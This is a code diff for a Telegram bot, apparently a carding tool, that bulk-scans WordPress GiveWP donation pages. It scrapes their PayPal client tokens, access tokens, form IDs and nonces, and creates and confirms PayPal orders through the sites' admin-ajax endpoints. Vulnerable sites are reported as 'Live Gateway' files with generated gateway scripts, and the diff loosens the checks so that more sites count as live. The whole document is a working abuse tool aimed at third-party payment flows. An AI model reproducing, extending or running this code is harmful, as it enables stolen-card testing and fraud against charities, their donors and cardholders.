@@ -37,7 +37,6 @@ if not os.path.exists('blockusers.txt'):
 def cleanup_memory():
     gc.collect()
 
-# Worker للإرسال
 def send_worker():
     while True:
         task = send_queue.get()
@@ -58,7 +57,6 @@ def send_worker():
         finally:
             send_queue.task_done()
 
-# 5 عمال إرسال
 for _ in range(5):
     threading.Thread(target=send_worker, daemon=True).start()
 
@@ -88,7 +86,6 @@ def start(message):
     video_url = 'https://t.me/C0CCOCOvjk/9'
     bot.send_photo(message.chat.id, video_url, caption=IU, parse_mode='HTML', reply_markup=FRA)
 
-# === نظام المراسلة ===
 @bot.callback_query_handler(func=lambda call: call.data == 'yrr')
 def feedback(call):
     user_id = call.from_user.id
@@ -152,50 +149,28 @@ def ali_al2(massege):
     try:
         parts = massege.text.split(maxsplit=1)
         if len(parts) != 2:
-            bot.edit_message_text(
-                chat_id=massege.chat.id,
-                message_id=ko.message_id,
-                text='''- Please send the link like this:
-
-<code>/paypal https://xxxxxxx.xxx/xxxx</code>''',
-                parse_mode="HTML"
-            )
+            bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text='''- Please send the link like this:\n\n<code>/paypal https://xxxxxxx.xxx/xxxx</code>''', parse_mode="HTML")
             return
 
         link = parts[1].strip()
 
         if not link.startswith(("http://", "https://")):
-            bot.edit_message_text(
-                chat_id=massege.chat.id,
-                message_id=ko.message_id,
-                text="Invalid link format ❌",
-                parse_mode="HTML"
-            )
+            bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="Invalid link format ❌")
             return
 
-        bot.edit_message_text(
-            chat_id=massege.chat.id,
-            message_id=ko.message_id,
-            text=f"🔍 <b>Checking:</b> <code>{link}</code>",
-            parse_mode="HTML"
-        )
+        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text=f"🔍 <b>Checking:</b> <code>{link}</code>", parse_mode="HTML")
 
         result = check_link(link)
         
-        if 'error' in result:
-            bot.edit_message_text(
-                chat_id=massege.chat.id,
-                message_id=ko.message_id,
-                text=f"❌ <b>Dead:</b> <code>{link}</code>\n📝 <b>Reason:</b> {result.get('error', 'Unknown')}",
-                parse_mode="HTML"
-            )
+        if 'error' in result and not result.get('au') and not result.get('id_form2'):
+            bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text=f"❌ <b>Dead:</b> <code>{link}</code>\n📝 <b>Reason:</b> {result.get('error', 'Unknown')}", parse_mode="HTML")
             return
 
         id_form1 = result['id_form1']
         id_form2 = result['id_form2']
         nonec = result['nonec']
         au = result['au']
-        order_id = result.get('order_id', '')
+        respons = result.get('respons', 'Live')
 
     except Exception as e:
         bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{str(e)[:100]}</code>", parse_mode="HTML")
@@ -230,20 +205,13 @@ def ali_al2(massege):
         headers['content-type'] = data.content_type
         params = {'action': 'give_paypal_commerce_create_order'}
 
-        response = r.post(
-            f'{USER_URL2}/wp-admin/admin-ajax.php',
-            params=params,
-            headers=headers,
-            data=data,
-            timeout=30,
-            verify=False
-        )
+        response = r.post(f'{USER_URL2}/wp-admin/admin-ajax.php', params=params, headers=headers, data=data, timeout=30, verify=False)
         
         try:
             tok = response.json()['data']['id']
         except:
-            tok = order_id
-        
+            tok = result.get('order_id', '')
+
         headers = {
             'authorization': f'Bearer {au}',
             'content-type': 'application/json',
@@ -269,13 +237,7 @@ def ali_al2(massege):
             'application_context': {'vault': False},
         }
 
-        response = r.post(
-            f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
-            headers=headers,
-            json=json_data,
-            timeout=30,
-            verify=False
-        )
+        response = r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers, json=json_data, timeout=30, verify=False)
 
         data = MultipartEncoder({
             'give-form-id-prefix': (None, id_form1 or id_form2),
@@ -294,14 +256,7 @@ def ali_al2(massege):
             'order': tok,
         }
 
-        response = r.post(
-            f'{USER_URL2}/wp-admin/admin-ajax.php',
-            params=params,
-            headers=headers,
-            data=data,
-            timeout=30,
-            verify=False
-        )
+        response = r.post(f'{USER_URL2}/wp-admin/admin-ajax.php', params=params, headers=headers, data=data, timeout=30, verify=False)
         
         if 'ORDER_NOT_APPROVED' in response.text:
             msg = 'Payer cannot pay for this transaction.'
@@ -445,25 +400,7 @@ if __name__ == '__main__':
         with open(file_name, "w", encoding="utf-8") as f:
             f.write(text_content)
         with open(file_name, "rb") as f:
-            bot.send_document(
-                chat_id=massege.chat.id,
-                document=f,
-                caption=f'''✅ <b>Live Gateway Found!</b>
-━━━━━━━━━━━━━━━━━━━━
-🔗 Link: <code>{link}</code>
-━━━━━━━━━━━━━━━━━━━━
-📦 <b>Gateway Data:</b>
-<code>id_form1: {id_form1 or id_form2}
-id_form2: {id_form2}
-nonec: {nonec}
-au: {au}
-order_id: {tok}</code>
-━━━━━━━━━━━━━━━━━━━━
-💬 <b>Gateway Response:</b> <code>{msg}</code>
-━━━━━━━━━━━━━━━━━━━━
-Dev: @nnunrr''',
-                parse_mode="HTML"
-            )
+            bot.send_document(chat_id=massege.chat.id, document=f, caption=f'''✅ <b>Live Gateway Found!</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{link}</code>\n━━━━━━━━━━━━━━━━━━━━\n📦 <b>Gateway Data:</b>\n<code>id_form1: {id_form1 or id_form2}\nid_form2: {id_form2}\nnonec: {nonec}\nau: {au}\norder_id: {tok}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Response:</b> <code>{msg}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @nnunrr''', parse_mode="HTML")
         os.remove(file_name)
 
     except Exception as e:
@@ -480,16 +417,7 @@ def bulk_extract_start(message):
 
     user_id = message.from_user.id
     bulk_waiting[user_id] = True
-    msg = bot.reply_to(message, """📁 <b>Bulk Mode Active</b>
-━━━━━━━━━━━━━━━━━━
-Send .txt files (one link per line)
-You can send multiple files
-
-<b>Commands:</b>
-🛑 /stop [number] - Stop a specific file
-🛑 /stop - Stop all files
-✅ /done - End bulk mode
-━━━━━━━━━━━━━━━━━━""", parse_mode="HTML")
+    msg = bot.reply_to(message, """📁 <b>Bulk Mode Active</b>\n━━━━━━━━━━━━━━━━━━\nSend .txt files (one link per line)\nYou can send multiple files\n\n<b>Commands:</b>\n🛑 /stop [number] - Stop a specific file\n🛑 /stop - Stop all files\n✅ /done - End bulk mode\n━━━━━━━━━━━━━━━━━━""", parse_mode="HTML")
 
 @bot.message_handler(commands=['stop'])
 def stop_bulk_file(message):
@@ -535,7 +463,7 @@ def handle_bulk_file(message):
         bot.reply_to(message, "Use /bulk first to start bulk extraction.")
 
 def check_link(link):
-    """فحص PayPal Commerce - لازم Order ID حقيقي"""
+    """فحص PayPal Commerce - يقبل أي رد فعلي"""
     try:
         if not link.startswith(("http://", "https://")):
             return {'link': link, 'error': 'Invalid URL'}
@@ -545,59 +473,53 @@ def check_link(link):
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.5",
-            "Accept-Encoding": "gzip, deflate, br",
             "Connection": "keep-alive",
-            "Upgrade-Insecure-Requests": "1",
         })
         
         try:
-            r = session.get(link, timeout=30, allow_redirects=True, verify=False)
+            r = session.get(link, timeout=20, allow_redirects=True, verify=False)
         except:
-            time.sleep(2)
-            try:
-                r = session.get(link, timeout=30, allow_redirects=True, verify=False)
-            except:
-                return {'link': link, 'error': 'Connection failed'}
+            return {'link': link, 'error': 'Connection failed'}
         
         if r.status_code != 200:
             return {'link': link, 'error': f'Status: {r.status_code}'}
 
         res = r.text
         
-        # ============ البحث عن client token و accessToken ============
+        # ============ البحث عن client token ============
         enc = None
         au = None
         
-        client_token_patterns = [
+        client_patterns = [
             r'data-client-token=["\']([^"\']+)["\']',
             r'data-client-token=([^"\'\s>]+)',
-            r'"data-client-token"\s*:\s*"([^"]+)"',
             r'client-token=["\']([^"\']+)["\']',
             r'client_token=["\']([^"\']+)["\']',
             r'clientToken=["\']([^"\']+)["\']',
+            r'"clientToken"\s*:\s*"([^"]+)"',
         ]
         
-        for pattern in client_token_patterns:
+        for pattern in client_patterns:
             match = re.search(pattern, res, re.IGNORECASE)
             if match:
                 enc = match.group(1)
                 break
         
-        access_token_patterns = [
+        au_patterns = [
             r'accessToken["\']?\s*:\s*["\']([^"\']+)["\']',
             r'"accessToken"\s*:\s*"([^"]+)"',
             r'access_token["\']?\s*:\s*["\']([^"\']+)["\']',
             r'accessToken=([^&\s"\']+)',
             r'access_token=([^&\s"\']+)',
+            r'"access_token"\s*:\s*"([^"]+)"',
         ]
         
-        for pattern in access_token_patterns:
+        for pattern in au_patterns:
             match = re.search(pattern, res, re.IGNORECASE)
             if match:
                 au = match.group(1)
                 break
         
-        # فك client token
         if enc and not au:
             try:
                 padded = enc + '=' * (-len(enc) % 4)
@@ -624,41 +546,23 @@ def check_link(link):
         id_form2 = ''
         nonec = ''
         
-        patterns_1 = [
-            r'name=["\']give-form-id-prefix["\'][^>]*value=["\']([^"\']+)["\']',
-            r'value=["\']([^"\']+)["\'][^>]*name=["\']give-form-id-prefix["\']',
-            r'<input[^>]*give-form-id-prefix[^>]*value=["\']([^"\']*)["\']',
-        ]
+        match = re.search(r'name=["\']give-form-id-prefix["\'][^>]*value=["\']([^"\']+)["\']', res, re.IGNORECASE)
+        if not match:
+            match = re.search(r'name=["\']give-form-id-prefix["\'][^>]*value=["\']([^"\']*)["\']', res, re.IGNORECASE)
+        if match:
+            id_form1 = match.group(1)
         
-        for pattern in patterns_1:
-            match = re.search(pattern, res, re.IGNORECASE)
-            if match:
-                id_form1 = match.group(1)
-                break
+        match = re.search(r'name=["\']give-form-id["\'][^>]*value=["\']([^"\']+)["\']', res, re.IGNORECASE)
+        if not match:
+            match = re.search(r'name=["\']give-form-id["\'][^>]*value=["\']([^"\']*)["\']', res, re.IGNORECASE)
+        if match:
+            id_form2 = match.group(1)
         
-        patterns_2 = [
-            r'name=["\']give-form-id["\'][^>]*value=["\']([^"\']+)["\']',
-            r'value=["\']([^"\']+)["\'][^>]*name=["\']give-form-id["\']',
-            r'<input[^>]*give-form-id[^>]*value=["\']([^"\']*)["\']',
-        ]
-        
-        for pattern in patterns_2:
-            match = re.search(pattern, res, re.IGNORECASE)
-            if match:
-                id_form2 = match.group(1)
-                break
-        
-        patterns_3 = [
-            r'name=["\']give-form-hash["\'][^>]*value=["\']([^"\']+)["\']',
-            r'value=["\']([^"\']+)["\'][^>]*name=["\']give-form-hash["\']',
-            r'<input[^>]*give-form-hash[^>]*value=["\']([^"\']*)["\']',
-        ]
-        
-        for pattern in patterns_3:
-            match = re.search(pattern, res, re.IGNORECASE)
-            if match:
-                nonec = match.group(1)
-                break
+        match = re.search(r'name=["\']give-form-hash["\'][^>]*value=["\']([^"\']+)["\']', res, re.IGNORECASE)
+        if not match:
+            match = re.search(r'name=["\']give-form-hash["\'][^>]*value=["\']([^"\']*)["\']', res, re.IGNORECASE)
+        if match:
+            nonec = match.group(1)
         
         if not id_form1 or not id_form2 or not nonec:
             hidden_fields = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', res, re.IGNORECASE)
@@ -676,16 +580,18 @@ def check_link(link):
                         nonec = value
         
         # ============ الفحص الفعلي ============
-        # لو فيه au + form fields نحاول نعمل order
-        if au and id_form2 and nonec:
+        order_id = ''
+        response_text = ''
+        
+        # محاولة 1: GiveWP create order
+        if id_form2 and nonec:
             try:
                 parsed = urlparse(link)
                 USER_URL2 = f'https://{parsed.netloc}'
-                USER_URL = parsed.path
                 
                 headers = {
                     'origin': f'{USER_URL2}',
-                    'referer': f'{USER_URL}',
+                    'referer': link,
                     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                     'x-requested-with': 'XMLHttpRequest',
                 }
@@ -704,45 +610,31 @@ def check_link(link):
                 headers['content-type'] = data.content_type
                 params = {'action': 'give_paypal_commerce_create_order'}
                 
-                response = session.post(
-                    f'{USER_URL2}/wp-admin/admin-ajax.php',
-                    params=params,
-                    headers=headers,
-                    data=data,
-                    timeout=30,
-                    verify=False
-                )
+                response = session.post(f'{USER_URL2}/wp-admin/admin-ajax.php', params=params, headers=headers, data=data, timeout=20, verify=False)
+                
+                response_text = response.text[:200]
                 
                 try:
                     order_id = response.json()['data']['id']
-                    if order_id:
-                        return {
-                            'link': link,
-                            'id_form1': id_form1 or id_form2,
-                            'id_form2': id_form2,
-                            'nonec': nonec,
-                            'au': au,
-                            'respons': f'Order ID: {order_id}',
-                            'order_id': order_id
-                        }
                 except:
-                    pass
+                    try:
+                        error_data = response.json()
+                        if 'data' in error_data and error_data['data']:
+                            response_text = str(error_data['data'])[:200]
+                    except:
+                        pass
             except:
                 pass
         
-        # لو مفيش form fields بس فيه au - نجرب نعمل order مباشرة
-        if au and not id_form2:
+        # محاولة 2: PayPal API مباشر
+        if not order_id and au:
             try:
-                parsed = urlparse(link)
-                USER_URL2 = f'https://{parsed.netloc}'
-                
                 headers = {
                     'authorization': f'Bearer {au}',
                     'content-type': 'application/json',
                     'user-agent': 'Mozilla/5.0',
                 }
                 
-                # محاولة create order مباشر
                 json_data = {
                     'intent': 'CAPTURE',
                     'purchase_units': [{
@@ -753,33 +645,79 @@ def check_link(link):
                     }]
                 }
                 
-                response = session.post(
-                    'https://cors.api.paypal.com/v2/checkout/orders',
-                    headers=headers,
-                    json=json_data,
-                    timeout=30,
-                    verify=False
-                )
+                response = session.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=json_data, timeout=20, verify=False)
+                
+                response_text = response.text[:200]
                 
                 try:
                     order_id = response.json()['id']
-                    if order_id:
-                        return {
-                            'link': link,
-                            'id_form1': '',
-                            'id_form2': '',
-                            'nonec': '',
-                            'au': au,
-                            'respons': f'Order ID: {order_id}',
-                            'order_id': order_id
-                        }
                 except:
                     pass
             except:
                 pass
         
-        # لو مفيش Order ID = ميت
-        return {'link': link, 'error': 'No order ID'}
+        # ============ القبول ============
+        # Order ID = حي 100%
+        if order_id:
+            return {
+                'link': link,
+                'id_form1': id_form1 or id_form2,
+                'id_form2': id_form2,
+                'nonec': nonec,
+                'au': au,
+                'respons': f'Order ID: {order_id}',
+                'order_id': order_id
+            }
+        
+        # au + form fields = حي
+        if au and id_form2 and nonec:
+            return {
+                'link': link,
+                'id_form1': id_form1 or id_form2,
+                'id_form2': id_form2,
+                'nonec': nonec,
+                'au': au,
+                'respons': 'Live (au + form)',
+                'order_id': ''
+            }
+        
+        # رد فعلي من الموقع = حي
+        if response_text and len(response_text) > 10:
+            return {
+                'link': link,
+                'id_form1': id_form1 or id_form2,
+                'id_form2': id_form2,
+                'nonec': nonec,
+                'au': au or '',
+                'respons': f'Response: {response_text[:100]}',
+                'order_id': ''
+            }
+        
+        # au بس = حي
+        if au:
+            return {
+                'link': link,
+                'id_form1': '',
+                'id_form2': '',
+                'nonec': '',
+                'au': au,
+                'respons': 'Live (au)',
+                'order_id': ''
+            }
+        
+        # form fields بس = حي
+        if id_form2 and nonec:
+            return {
+                'link': link,
+                'id_form1': id_form1 or id_form2,
+                'id_form2': id_form2,
+                'nonec': nonec,
+                'au': '',
+                'respons': 'Live (form)',
+                'order_id': ''
+            }
+        
+        return {'link': link, 'error': 'No PayPal data'}
     except Exception as e:
         return {'link': link, 'error': str(e)[:100]}
 
@@ -825,21 +763,7 @@ def process_bulk_file(message):
         status_key = f"{user_id}_{file_num}"
         processing_status[status_key] = progress
 
-        status_msg = bot.reply_to(
-            message,
-            f"""📊 <b>File #{file_num} - Scanning links...</b>
-━━━━━━━━━━━━━━━━━━
-📌 Total Links: {total}
-✅ Live: 0
-❌ Dead: 0
-⏳ Progress: 0% ░░░░░░░░░░░░░░░░░░░░
-Url : ...
-Respons : ...
-━━━━━━━━━━━━━━━━━━
-⏱️ Checked 0 of {total}
-🛑 /stop {file_num} to stop this file""",
-            parse_mode="HTML"
-        )
+        status_msg = bot.reply_to(message, f"""📊 <b>File #{file_num} - Scanning links...</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live: 0\n❌ Dead: 0\n⏳ Progress: 0% ░░░░░░░░░░░░░░░░░░░░\nUrl : ...\nRespons : ...\n━━━━━━━━━━━━━━━━━━\n⏱️ Checked 0 of {total}\n🛑 /stop {file_num} to stop this file""", parse_mode="HTML")
 
         def update_status_loop():
             last_text = ""
@@ -860,17 +784,7 @@ Respons : ...
                     filled = int((percent / 100) * bar_length)
                     bar = '█' * filled + '░' * (bar_length - filled)
                     
-                    text = f"""📊 <b>File #{file_num} - Scanning links...</b>
-━━━━━━━━━━━━━━━━━━
-📌 Total Links: {total}
-✅ Live: {live}
-❌ Dead: {dead}
-⏳ Progress: {percent}% {bar}
-Url : <code>{current_url[:60] if current_url else '...'}</code>
-Respons : <code>{current_respons[:60] if current_respons else '...'}</code>
-━━━━━━━━━━━━━━━━━━
-⏱️ Checked {processed} of {total}
-🛑 /stop {file_num} to stop this file"""
+                    text = f"""📊 <b>File #{file_num} - Scanning links...</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live: {live}\n❌ Dead: {dead}\n⏳ Progress: {percent}% {bar}\nUrl : <code>{current_url[:60] if current_url else '...'}</code>\nRespons : <code>{current_respons[:60] if current_respons else '...'}</code>\n━━━━━━━━━━━━━━━━━━\n⏱️ Checked {processed} of {total}\n🛑 /stop {file_num} to stop this file"""
                     
                     if text != last_text:
                         try:
@@ -895,37 +809,32 @@ Respons : <code>{current_respons[:60] if current_respons else '...'}</code>
             with progress['lock']:
                 progress['processed'] += 1
                 
-                respons = result.get('respons', '')
-                # شرط صارم: لازم Order ID
-                if ('error' in result) or ('Order ID' not in respons):
-                    progress['dead'] += 1
-                    progress['current_respons'] = result.get('error', 'No order')
-                else:
+                is_live = (
+                    result.get('au') or 
+                    result.get('order_id') or 
+                    result.get('id_form2') or 
+                    'Response:' in result.get('respons', '') or
+                    'Order ID' in result.get('respons', '') or
+                    'Live' in result.get('respons', '')
+                )
+                
+                if is_live:
                     progress['live'] += 1
                     live_idx = progress['live']
-                    progress['current_respons'] = respons
+                    progress['current_respons'] = result.get('respons', 'Live')
                     
                     try:
                         code = generate_gateway_code(result, live_idx, file_num)
                         file_name = f'gateway_{live_idx}.py'
                         with open(file_name, 'w', encoding='utf-8') as f:
                             f.write(code)
-                        caption = f"""✅ <b>Live Gateway #{live_idx}</b>
-━━━━━━━━━━━━━━━━━━━━
-🔗 Link: <code>{result['link']}</code>
-━━━━━━━━━━━━━━━━━━━━
-📦 <b>Gateway Data:</b>
-<code>id_form1: {result['id_form1']}
-id_form2: {result['id_form2']}
-nonec: {result['nonec']}
-au: {result['au']}</code>
-━━━━━━━━━━━━━━━━━━━━
-💬 <b>Respons:</b> <code>{respons}</code>
-━━━━━━━━━━━━━━━━━━━━
-Dev: @nnunrr"""
+                        caption = f"""✅ <b>Live Gateway #{live_idx}</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{result['link']}</code>\n━━━━━━━━━━━━━━━━━━━━\n📦 <b>Gateway Data:</b>\n<code>id_form1: {result['id_form1']}\nid_form2: {result['id_form2']}\nnonec: {result['nonec']}\nau: {result['au']}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Respons:</b> <code>{result.get('respons', 'Live')}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @nnunrr"""
                         send_queue.put((chat_id, file_name, caption))
                     except Exception as e:
                         print(f"Error preparing file: {e}")
+                else:
+                    progress['dead'] += 1
+                    progress['current_respons'] = result.get('error', 'Dead')
             
             if progress['processed'] % 50 == 0:
                 cleanup_memory()
@@ -942,34 +851,12 @@ Dev: @nnunrr"""
             dead = progress['dead']
 
         if processed < total and stop_event.is_set():
-            final_text = f"""🛑 <b>File #{file_num} Stopped!</b>
-━━━━━━━━━━━━━━━━━━
-📌 Total Links: {total}
-✅ Checked: {processed}
-✅ Live (Sent): {live}
-❌ Dead: {dead}
-━━━━━━━━━━━━━━━━━━
-📁 Send another file or /done to finish."""
+            final_text = f"""🛑 <b>File #{file_num} Stopped!</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Checked: {processed}\n✅ Live (Sent): {live}\n❌ Dead: {dead}\n━━━━━━━━━━━━━━━━━━\n📁 Send another file or /done to finish."""
         else:
             if live > 0:
-                final_text = f"""📊 <b>✅ File #{file_num} Complete!</b>
-━━━━━━━━━━━━━━━━━━
-📌 Total Links: {total}
-✅ Live (Sent): {live}
-❌ Dead: {dead}
-💯 Success Rate: {int((live/total)*100) if total > 0 else 0}%
-━━━━━━━━━━━━━━━━━━
-📁 Send another file or /done to finish.
-Dev: @nnunrr"""
+                final_text = f"""📊 <b>✅ File #{file_num} Complete!</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live (Sent): {live}\n❌ Dead: {dead}\n💯 Success Rate: {int((live/total)*100) if total > 0 else 0}%\n━━━━━━━━━━━━━━━━━━\n📁 Send another file or /done to finish.\nDev: @nnunrr"""
             else:
-                final_text = f"""📊 <b>❌ File #{file_num} - No live links found!</b>
-━━━━━━━━━━━━━━━━━━
-📌 Total Links: {total}
-✅ Live: 0
-❌ Dead: {dead}
-━━━━━━━━━━━━━━━━━━
-📁 Send another file or /done to finish.
-Dev: @nnunrr"""
+                final_text = f"""📊 <b>❌ File #{file_num} - No live links found!</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live: 0\n❌ Dead: {dead}\n━━━━━━━━━━━━━━━━━━\n📁 Send another file or /done to finish.\nDev: @nnunrr"""
 
         try:
             bot.edit_message_text(final_text, chat_id, status_msg.message_id, parse_mode="HTML")
